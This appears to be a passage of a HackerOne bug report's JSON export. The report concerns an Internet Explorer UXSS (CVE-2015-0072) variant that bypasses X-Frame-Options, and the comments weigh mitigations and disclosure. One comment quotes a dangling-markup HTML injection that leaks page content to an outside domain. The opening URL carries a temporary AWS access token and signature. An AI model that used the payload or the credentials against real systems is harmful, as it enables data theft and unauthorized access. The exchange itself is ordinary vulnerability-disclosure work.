ackerone_uxss_ie_win_server_2012_r2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ25CUMV77%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T041511Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAzPBxfjhI%2FOiR%2B1g7qgHtu%2BTSWR72ZbKmRPdv61x9tZAiEA7d5guv7RrcybHHoMbJ5xcSYkf5cIncRQif%2BDwrhUxL4qtAMIURABGgwwMTM2MTkyNzQ4NDkiDLU8cXGXokn2dJzgWyqRA5t82BwvWjjXR1flrxPY1G8nb%2BmyZbhMX7bIDSshUvXOZWrYMuqnjFp50lwKRioT0tqSyswhE%2FmxcGN2dZffgFfm45Y15zW32QivQspJz2zpwJxFycBtjnRvl%2FMGegWgMTliaPfGzxGYLkpzI0cHFjLk%2BKaC50Jxtx51oChC%2BCytCTVfzOq2Ax%2BcOQ92r8%2FEVvUqeZR%2BTPUidVPdANT%2FJyfcDkVZSZzQz9EjBhPlfadpw5dBs4QJ%2BDdADV0MdhKltTlk%2FyXYCPqWqRloAtWd1nGtuRb2iTe6dG%2FjlvEdGxsyq3XSWVpxob44SfkNT25WtiGoWTrQta7tHUBAIeejr1qo89oGEttSf7d8Lku1wWROst97KwhMf%2B%2Bj34q6jzK8i1Hw8XE5vydIGbQfSR452%2FCUDzasjIErk2%2F0Ktvsz%2Bx3csi5j3IwrXlZf4YgORAmKN1LdQQkzS%2BV1sgEfBg4MiQjSsKotzm%2FUgXxu10BwEW2Dhb8oNMpsZ1FjdjbCQGOQD7Feifp2fVzXkXhF1DMwndWMOrpqf8FOusBKlCtIwN5UHYU%2F5Q2IWJVa2twlUdU6iZvdqJG%2FbyL1HncSkMTTf174kVtrd08ZtfhfQ%2B%2FGZMeT3%2BWmMgtiSxiN8zlfLWyyOmRNNNrcZLeamXU8gijNm5O%2FRQyUqS40M%2B09rACFWxFC6eSAj2%2BBOBxHA6bEgtgV3Z6D4uLX3zxwXXu%2BF%2BhhCTXgcbobecE2HXiCLYk05uES7bSCIeUoggVUmunssom%2Bu8yCYvg2qvqpHVNwChBmtVZLiGt79EkgpsqfgvK113rJiRtjBkxEHINtbd%2FcmRPwl2VUc1W%2BEpCc%2FxxQcCayPndzJKPSw%3D%3D\u0026X-Amz-Signature=cdfbd2573169c76f47ca989b30a92fb7264f341027fd5b57bb9beb7b6b24484e"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":741579,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @zombiehelp54,\n\nThank you for your report! We will need some time to investigate this and get back to you, so please bear with us.\n\nRegards,\nAndrew","markdown_message":"\u003cp\u003eHi \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report! We will need some time to investigate this and get back to you, so please bear with us.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nAndrew\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-05T02:27:24.324Z","updated_at":"2016-01-05T02:27:24.324Z","actor":{"username":"andrewone","cleared":false,"url":"/andrewone","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/236/a5d3675b5d06cc936fbcc467cc8643e779371f3a_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":742601,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hey @zombiehelp54,\n\nIt seems like you are using a (since patched) known bug in Internet Explorer to achieve this, is that correct? Using IE 11.0.9600.17.17691, I can't reproduce your PoC. Is this correct? If in the most recent versions of IE 9, 10 and 11 this is fixed, it doesn't appear to be anything specific to HackerOne, nor something we can do anything about.\n\nKind regards,\nDirk","markdown_message":"\u003cp\u003ehey \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eIt seems like you are using a (since patched) known bug in Internet Explorer to achieve this, is that correct? Using IE 11.0.9600.17.17691, I can\u0026#39;t reproduce your PoC. Is this correct? If in the most recent versions of IE 9, 10 and 11 this is fixed, it doesn\u0026#39;t appear to be anything specific to HackerOne, nor something we can do anything about.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\nDirk\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-05T16:22:24.251Z","updated_at":"2016-01-05T16:22:24.251Z","actor":{"username":"dirk","cleared":false,"url":"/dirk","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/067/f9785240873663ec965b04e725871ed0f69616e7_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":743045,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @Dirk,\n\nThis is the same vulnerability reported by @avlidienbrunn in #103787 (CVE 2015-0072) which requires at least one framed resource without X-Frame-Options header. Here I have managed to make it work with any resource even if it is protected with X-Frame-Options header by triggering alert() in parallel with payload execution which makes response header and body accessible (this wasn't possible in 2015-0072 with protected resources). the version you mentioned (11.0.9600.17691) is the first patched one from Microsoft after applying MS15-018 on March 10 2015, This will work with all predecessor versions. I thought you would be interested in this as there still wide versions of IE affected. \n\nThanks;","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dirk\"\u003e@Dirk\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThis is the same vulnerability reported by \u003ca href=\"/avlidienbrunn\"\u003e@avlidienbrunn\u003c/a\u003e in \u003ca href=\"/reports/103787\"\u003e#103787\u003c/a\u003e (CVE 2015-0072) which requires at least one framed resource without X-Frame-Options header. Here I have managed to make it work with any resource even if it is protected with X-Frame-Options header by triggering alert() in parallel with payload execution which makes response header and body accessible (this wasn\u0026#39;t possible in 2015-0072 with protected resources). the version you mentioned (11.0.9600.17691) is the first patched one from Microsoft after applying MS15-018 on March 10 2015, This will work with all predecessor versions. I thought you would be interested in this as there still wide versions of IE affected. \u003c/p\u003e\n\n\u003cp\u003eThanks;\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-05T20:13:43.352Z","updated_at":"2016-01-05T20:13:43.352Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":743067,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"BTW, @reed has pointed to CSRF tokens unique per form as possible mitigation in #103787","markdown_message":"\u003cp\u003eBTW, \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e has pointed to CSRF tokens unique per form as possible mitigation in \u003ca href=\"/reports/103787\"\u003e#103787\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-05T20:26:57.570Z","updated_at":"2016-01-05T20:26:57.570Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":743452,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"At the time of @avlidienbrunn's report, my understanding was that the IE vulnerability had not yet been fixed, so it was more of a concern to any current IE users on the platform (so we mitigated the reported issue, though it seems like you've found another way to get the CSRF token using `current_user.json`). Now that the IE issue is patched, I'm having a hard time worrying about a fixed vulnerability. Browsers constantly have vulnerabilities, and people need to keep their browsers updated to ensure bad things don't happen to them. Somebody could just as easily use an old IE RCE vulnerability to gain full access over the user's machine, versus just getting the CSRF token for one site.\n\nAs for the unique CSRF tokens per form change, we're not likely to implement that until Rails 5 comes out (with the PR mentioned in #103787) due to the invasiveness of the change. Are there any other mitigations you're aware of? I added @avlidienbrunn for his thoughts as well.\n\nBelieve me, I would love for us to be protected from all browser vulnerabilities, but considering IE versions before Edge don't even support CSP, it's hard to treat the browser with the same respect. Basically, keep your browser upgraded, or you will be pwned.\n\nI welcome any and all thoughts.","markdown_message":"\u003cp\u003eAt the time of \u003ca href=\"/avlidienbrunn\"\u003e@avlidienbrunn\u003c/a\u003e\u0026#39;s report, my understanding was that the IE vulnerability had not yet been fixed, so it was more of a concern to any current IE users on the platform (so we mitigated the reported issue, though it seems like you\u0026#39;ve found another way to get the CSRF token using \u003ccode\u003ecurrent_user.json\u003c/code\u003e). Now that the IE issue is patched, I\u0026#39;m having a hard time worrying about a fixed vulnerability. Browsers constantly have vulnerabilities, and people need to keep their browsers updated to ensure bad things don\u0026#39;t happen to them. Somebody could just as easily use an old IE RCE vulnerability to gain full access over the user\u0026#39;s machine, versus just getting the CSRF token for one site.\u003c/p\u003e\n\n\u003cp\u003eAs for the unique CSRF tokens per form change, we\u0026#39;re not likely to implement that until Rails 5 comes out (with the PR mentioned in \u003ca href=\"/reports/103787\"\u003e#103787\u003c/a\u003e) due to the invasiveness of the change. Are there any other mitigations you\u0026#39;re aware of? I added \u003ca href=\"/avlidienbrunn\"\u003e@avlidienbrunn\u003c/a\u003e for his thoughts as well.\u003c/p\u003e\n\n\u003cp\u003eBelieve me, I would love for us to be protected from all browser vulnerabilities, but considering IE versions before Edge don\u0026#39;t even support CSP, it\u0026#39;s hard to treat the browser with the same respect. Basically, keep your browser upgraded, or you will be pwned.\u003c/p\u003e\n\n\u003cp\u003eI welcome any and all thoughts.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-06T00:31:42.133Z","updated_at":"2016-01-06T00:31:42.133Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":743454,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2016-01-06T00:32:36.892Z","updated_at":"2016-01-06T00:32:36.892Z","actor":{"username":"avlidienbrunn","cleared":true,"url":"/avlidienbrunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/948/699d45bda29817e724a5a2399862812a14dba902_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":743513,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @reed,\n\nThank you for making this clear. I can see your point here and I tend to agree with you.\nBut please give a little respect to IE cause without it we can't download Chrome or Firefox :D\n\nThanks;","markdown_message":"\u003cp\u003eHey \u003ca href=\"/reed\"\u003e@reed\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for making this clear. I can see your point here and I tend to agree with you.\u003cbr\u003e\nBut please give a little respect to IE cause without it we can\u0026#39;t download Chrome or Firefox :D\u003c/p\u003e\n\n\u003cp\u003eThanks;\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-06T01:14:45.235Z","updated_at":"2016-01-06T01:14:45.235Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":744114,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey everyone!\n\nIf the UXSS can be used even with X-Frame-Options (can't verify right now), nice find @zombiehelp54 :) If that's the case, I don't see any other mitigations you can put in place for this particular SOP Bypass. \n\nThe other report lead to mitigation of other SOP Bypasses as well, because current_user.json can't be read without the X-Requested-With header. It also mitigates \"HTML leak\" CSP bypasses where an attacker would inject incorrect HTML so that an attribute would leak through the document (for instance, injecting ```\u003cimg src='https://avlidienbrunn.se?```).\n\nAs for other mitigations, you could remove the \"_method\" functionality if you don't use it. Potentially try to fingerprint browser version from \"User-Agent\" header and block all functionality for those browsers and give a \"Please update your browser\" message.\n\nProbably overkill, but that's what I could think of :)","markdown_message":"\u003cp\u003eHey everyone!\u003c/p\u003e\n\n\u003cp\u003eIf the UXSS can be used even with X-Frame-Options (can\u0026#39;t verify right now), nice find \u003ca href=\"/zombiehelp54\"\u003e@zombiehelp54\u003c/a\u003e :) If that\u0026#39;s the case, I don\u0026#39;t see any other mitigations you can put in place for this particular SOP Bypass. \u003c/p\u003e\n\n\u003cp\u003eThe other report lead to mitigation of other SOP Bypasses as well, because current_user.json can\u0026#39;t be read without the X-Requested-With header. It also mitigates \u0026quot;HTML leak\u0026quot; CSP bypasses where an attacker would inject incorrect HTML so that an attribute would leak through the document (for instance, injecting \u003ccode\u003e\u0026lt;img src=\u0026#39;https://avlidienbrunn.se?\u003c/code\u003e).\u003c/p\u003e\n\n\u003cp\u003eAs for other mitigations, you could remove the \u0026quot;_method\u0026quot; functionality if you don\u0026#39;t use it. Potentially try to fingerprint browser version from \u0026quot;User-Agent\u0026quot; header and block all functionality for those browsers and give a \u0026quot;Please update your browser\u0026quot; message.\u003c/p\u003e\n\n\u003cp\u003eProbably overkill, but that\u0026#39;s what I could think of :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-06T11:46:44.518Z","updated_at":"2016-01-06T11:46:44.518Z","actor":{"username":"avlidienbrunn","cleared":true,"url":"/avlidienbrunn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/948/699d45bda29817e724a5a2399862812a14dba902_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":744307,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @avlidienbrunn,\n\nThanks for your mitigation suggestions. You inspired me of another idea that may stop this attack. We can make a whitelist of domains allowed in `Referer: ` header which is being sent in framed resource request by IE and if the `Referer ` is not in the whitelist just redirect to a sandboxed domain showing a message thus SOP bypass will end up to the sandboxed domain. I can't confirm this will work as I didn't test it.\n\nThanks;","markdown_message":"\u003cp\u003eHey \u003ca href=\"/avlidienbrunn\"\u003e@avlidienbrunn\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for your mitigation suggestions. You inspired me of another idea that may stop this attack. We can make a whitelist of domains allowed in \u003ccode\u003eReferer:\u003c/code\u003e header which is being sent in framed resource request by IE and if the \u003ccode\u003eReferer\u003c/code\u003e is not in the whitelist just redirect to a sandboxed domain showing a message thus SOP bypass will end up to the sandboxed domain. I can\u0026#39;t confirm this will work as I didn\u0026#39;t test it.\u003c/p\u003e\n\n\u003cp\u003eThanks;\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-06T15:36:50.366Z","updated_at":"2016-01-06T15:36:50.366Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":754260,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"I'm going to close this out as Informative for now. The IE issue is fixed, and [as of tomorrow](https://www.microsoft.com/en-us/WindowsForBusiness/End-of-IE-support), most IE versions will be EOL'd. Hoping folks move over to Edge soon so basic things like CSP and other mitigations Just Works(TM).\n\nWe'll revisit this if something else comes up. The Rails per-form CSRF token patch did land at least, so Rails 5 will have that mitigation built-in. That should be released in the coming months, so we'll pick that up once we upgrade.\n\nYou both gave some great ideas on mitigation strategies for this and other issues, and we'll take those into account as well as we would to improve the platform's security. Thank you!","markdown_message":"\u003cp\u003eI\u0026#39;m going to close this out as Informative for now. The IE issue is fixed, and \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.microsoft.com%2Fen-us%2FWindowsForBusiness%2FEnd-of-IE-support\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eas of tomorrow\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, most IE versions will be EOL\u0026#39;d. Hoping folks move over to Edge soon so basic things like CSP and other mitigations Just Works(TM).\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll revisit this if something else comes up. The Rails per-form CSRF token patch did land at least, so Rails 5 will have that mitigation built-in. That should be released in the coming months, so we\u0026#39;ll pick that up once we upgrade.\u003c/p\u003e\n\n\u003cp\u003eYou both gave some great ideas on mitigation strategies for this and other issues, and we\u0026#39;ll take those into account as well as we would to improve the platform\u0026#39;s security. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-01-12T05:23:44.042Z","updated_at":"2016-01-12T05:23:44.042Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1172022,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ping!","markdown_message":"\u003cp\u003ePing!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-09-03T20:57:13.908Z","updated_at":"2016-09-03T20:57:13.908Z","actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1621042,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hey guys,\nIs it possible to disclose this one?\n\nThanks!","markdown_message":"\u003cp\u003eHey guys,\u003cbr\u003e\nIs it possible to disclose this one?\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-19T13:44:19.338Z","updated_at":"2017-04-19T13:44:19.338Z","first_to_agree":true,"actor":{"username":"zombiehelp54","cleared":true,"url":"/zombiehelp54","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/135/f45785bb8d3f76465ddf981069b5b7f94ad1d93c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1621759,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-19T18:16:55.889Z","updated_at":"2017-04-19T18:16:55.889Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1621760,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-19T18:16:55.915Z","updated_at":"2017-04-19T18:16:55.915Z","actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3819,"category":"researcher","content":"We managed to get IE UXSS (CVE 2015-0072) to work even when X-Frame-Options header exists with `Deny` or `SAMEORIGIN`.\n\nThanks my brother Alaa for the help on this one.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eWe managed to get IE UXSS (CVE 2015-0072) to work even when X-Frame-Options header exists with \u003ccode\u003eDeny\u003c/code\u003e or \u003ccode\u003eSAMEORIGIN\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eThanks my brother Alaa for the help on this one.\u003c/p\u003e\n"}]}